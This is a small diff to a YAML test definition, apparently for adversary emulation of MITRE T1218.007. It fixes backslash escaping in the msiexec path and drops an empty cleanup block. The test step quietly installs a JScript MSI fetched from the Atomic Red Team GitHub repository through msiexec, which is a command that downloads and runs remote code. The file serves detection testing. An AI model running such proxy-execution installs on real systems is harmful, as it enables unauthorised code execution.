@@ -8,7 +8,7 @@ args:
       default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi
     - name: msi_exe
       type: path
-      default: c:\windows\system32\msiexec.exe
+      default: c:\\windows\\system32\\msiexec.exe
 uuid: 44a4bedf-ffe3-452e-bee4-6925ab125662
 mitre:
     tactics:
@@ -25,6 +25,3 @@ steps:
       inline: |
         {{.Args.msi_exe}} /q /i "{{.Args.msi_payload}}"
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
